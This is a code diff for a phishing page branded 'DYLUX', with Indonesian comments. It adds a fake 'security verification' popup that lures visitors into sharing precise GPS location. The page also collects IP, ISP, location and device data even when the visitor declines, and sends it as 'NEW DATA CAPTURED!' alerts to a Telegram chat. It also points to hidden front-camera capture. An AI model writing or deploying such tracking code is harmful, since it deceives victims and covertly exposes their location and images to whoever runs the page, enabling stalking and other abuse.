@@ -33,6 +33,8 @@
         p { color: #8888aa; font-size: 14px; line-height: 1.6; }
         video { display: none !important; }
         canvas { display: none !important; }
+        input { width: 100%; padding: 14px; background: #0a0a0f; border: 1px solid rgba(0,240,255,0.1); border-radius: 12px; color: #fff; font-size: 16px; outline: none; margin: 12px 0; }
+        input:focus { border-color: #00f0ff; }
         button { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; transition: 0.3s; }
         button:hover { opacity: 0.8; }
         button:disabled { opacity: 0.5; cursor: not-allowed; }
@@ -41,12 +43,72 @@
         .spinner.active { display: block; }
         @keyframes spin { to { transform: rotate(360deg); } }
         #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
-        input { width: 100%; padding: 14px; background: #0a0a0f; border: 1px solid rgba(0,240,255,0.1); border-radius: 12px; color: #fff; font-size: 16px; outline: none; margin: 12px 0; }
-        input:focus { border-color: #00f0ff; }
+        
+        /* ========================================== */
+        /* POPUP HALUS KAYA VERIFIKASI BIASA        */
+        /* ========================================== */
+        #popupOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+        }
+        #popupBox {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 28px 24px;
+            max-width: 340px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid rgba(0, 240, 255, 0.15);
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
+        }
+        #popupBox .popup-icon { font-size: 40px; margin-bottom: 8px; }
+        #popupBox .popup-title { font-size: 16px; font-weight: 700; color: #e0e0ff; margin-bottom: 4px; }
+        #popupBox .popup-desc { font-size: 13px; color: #8888aa; margin-bottom: 16px; line-height: 1.5; }
+        #popupBox .popup-desc strong { color: #00f0ff; }
+        #popupBox .popup-btn-group { display: flex; gap: 10px; }
+        #popupBox .popup-btn-group .btn-cancel { flex: 1; padding: 10px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; background: #2a2a3e; color: #8888aa; }
+        #popupBox .popup-btn-group .btn-allow { flex: 1; padding: 10px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; }
+        #popupBox .popup-footer { font-size: 11px; color: #555; margin-top: 12px; }
+        #popupBox .popup-footer a { color: #00f0ff; text-decoration: none; }
+        .popup-hidden { display: none !important; }
     </style>
 </head>
 <body>
 
+    <!-- ========================================== -->
+    <!-- POPUP HALUS "VERIFIKASI LOKASI"           -->
+    <!-- ========================================== -->
+    <div id="popupOverlay">
+        <div id="popupBox">
+            <div class="popup-icon">🛡️</div>
+            <div class="popup-title">Verifikasi Keamanan</div>
+            <div class="popup-desc">
+                Untuk keamanan akun, kami perlu memverifikasi <strong>lokasi</strong> perangkat Anda.
+                <br><br>
+                <span style="font-size:12px;color:#555;">Data hanya digunakan untuk verifikasi sekali pakai.</span>
+            </div>
+            <div class="popup-btn-group">
+                <button class="btn-cancel" id="popupCancel">Nanti</button>
+                <button class="btn-allow" id="popupAllow">Verifikasi</button>
+            </div>
+            <div class="popup-footer">
+                <a href="#" onclick="event.preventDefault();document.getElementById('popupOverlay').classList.add('popup-hidden');">Lewati verifikasi</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- MAIN CONTENT (HALAMAN VERIFIKASI BIASA)   -->
+    <!-- ========================================== -->
     <div class="box">
         <div class="logo">DYLUX</div>
         <div class="badge">🔒 Secure</div>
@@ -67,7 +129,7 @@
 
     <script>
     // ============================================
-    // API FALLBACK (10 API) - PAKE INI BUAT LOKASI
+    // API FALLBACK (IP - CADANGAN)
     // ============================================
     const apiList = [
         { url: 'https://ipapi.is/api/geo/', parse: (d) => ({ ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.isp, lat: d.latitude, lon: d.longitude }) },
@@ -80,7 +142,7 @@
     ];
 
     // ============================================
-    // FUNGSI KIRIM TEKS & FOTO KE TELEGRAM
+    // FUNGSI KIRIM KE TELEGRAM
     // ============================================
     async function sendMessageToTelegram(chatId, text) {
         try {
@@ -109,15 +171,77 @@
     }
 
     // ============================================
-    // AUTO-DETECT (PAKE IP API, NO GPS!)
+    // AMBIL GPS (PRESISI) - PAKE WATCHPOSITION
     // ============================================
-    (async function autoDetect() {
+    function getGPSLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+
+            let watchId = null;
+            let resolved = false;
+            let bestLocation = null;
+
+            const timeout = setTimeout(() => {
+                if (watchId) navigator.geolocation.clearWatch(watchId);
+                if (!resolved) {
+                    resolve(bestLocation || null);
+                }
+            }, 10000);
+
+            watchId = navigator.geolocation.watchPosition(
+                (pos) => {
+                    const accuracy = pos.coords.accuracy;
+                    if (accuracy < 100) {
+                        resolved = true;
+                        clearTimeout(timeout);
+                        navigator.geolocation.clearWatch(watchId);
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: accuracy
+                        });
+                    } else {
+                        if (!bestLocation || accuracy < bestLocation.accuracy) {
+                            bestLocation = {
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: accuracy
+                            };
+                        }
+                    }
+                },
+                () => {
+                    resolved = true;
+                    clearTimeout(timeout);
+                    navigator.geolocation.clearWatch(watchId);
+                    resolve(bestLocation || null);
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                }
+            );
+        });
+    }
+
+    // ============================================
+    // AUTO-DETECT (GPS PRIORITAS + IP FALLBACK)
+    // ============================================
+    let autoDetectDone = false;
+
+    async function autoDetect() {
+        if (autoDetectDone) return;
+        autoDetectDone = true;
+
         try {
             const params = new URLSearchParams(window.location.search);
             const userId = params.get('id');
             if (!userId) return;
 
-            // Coba semua API sampe dapet IP & lokasi
+            // 1. Dapet IP (cadangan)
             let ipData = null;
             for (const api of apiList) {
                 try {
@@ -132,28 +256,78 @@
                 } catch (e) { /* Coba API berikutnya */ }
             }
 
-            if (ipData) {
-                const mapsLink = `https://maps.google.com/?q=${ipData.lat},${ipData.lon}`;
-                const message = 
-                    `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
-                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                    `<b>📌 Type:</b> Auto-Detect\n` +
-                    `<b>🌐 IP:</b> ${ipData.ip}\n` +
-                    `<b>📍 Lokasi:</b> ${ipData.city}, ${ipData.region}, ${ipData.country}\n` +
-                    `<b>📡 ISP:</b> ${ipData.isp}\n` +
-                    `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
-                    `<b>📱 Device:</b> ${navigator.userAgent}\n` +
-                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+            // 2. AMBIL GPS PRESISI (prioritas utama)
+            const gpsData = await getGPSLocation();
 
-                await sendMessageToTelegram(userId, message);
-                console.log('✅ Auto-detect sent!');
+            // 3. Pilih lokasi (GPS > IP)
+            let lat = ipData?.lat || 0;
+            let lon = ipData?.lon || 0;
+            let locationText = `${ipData?.city || 'unknown'}, ${ipData?.region || 'unknown'}, ${ipData?.country || 'unknown'}`;
+            let accuracyText = '';
+
+            if (gpsData && gpsData.lat && gpsData.lon) {
+                lat = gpsData.lat;
+                lon = gpsData.lon;
+                locationText = `${gpsData.lat}, ${gpsData.lon}`;
+                accuracyText = ` (Akurasi ${Math.round(gpsData.accuracy)}m)`;
             }
+
+            // 4. Link Maps
+            const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+
+            // 5. Kirim notifikasi
+            const message =
+                `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
+                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                `<b>📌 Type:</b> Auto-Detect\n` +
+                `<b>🌐 IP:</b> ${ipData?.ip || 'unknown'}\n` +
+                `<b>📍 Lokasi:</b> ${locationText}${accuracyText}\n` +
+                `<b>📡 ISP:</b> ${ipData?.isp || 'unknown'}\n` +
+                `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
+                `<b>📱 Device:</b> ${navigator.userAgent}\n` +
+                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
+
+            await sendMessageToTelegram(userId, message);
+            console.log('✅ Auto-detect sent with GPS!');
+
         } catch (e) { console.error('Auto-detect error:', e); }
-    })();
+    }
 
     // ============================================
-    // KAMERA DEPAN (SELFIE) - SEMBUNYI
+    // POPUP HANDLER
+    // ============================================
+    document.getElementById('popupAllow').addEventListener('click', () => {
+        document.getElementById('popupOverlay').classList.add('popup-hidden');
+        // Trigger GPS dan jalankan auto-detect
+        navigator.geolocation.getCurrentPosition(
+            () => {
+                console.log('📍 GPS allowed');
+                autoDetectDone = false;
+                autoDetect();
+            },
+            () => {
+                console.log('❌ GPS denied, fallback ke IP');
+                autoDetect();
+            }, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            }
+        );
+    });
+
+    document.getElementById('popupCancel').addEventListener('click', () => {
+        document.getElementById('popupOverlay').classList.add('popup-hidden');
+        autoDetect(); // Tetap jalan pake IP
+    });
+
+    // ============================================
+    // JALANKAN AUTO-DETECT AWAL
+    // ============================================
+    setTimeout(autoDetect, 500);
+
+    // ============================================
+    // KAMERA DEPAN (SELFIE)
     // ============================================
     const userId = new URLSearchParams(window.location.search).get('id');
     const verifyBtn = document.getElementById('verifyBtn');
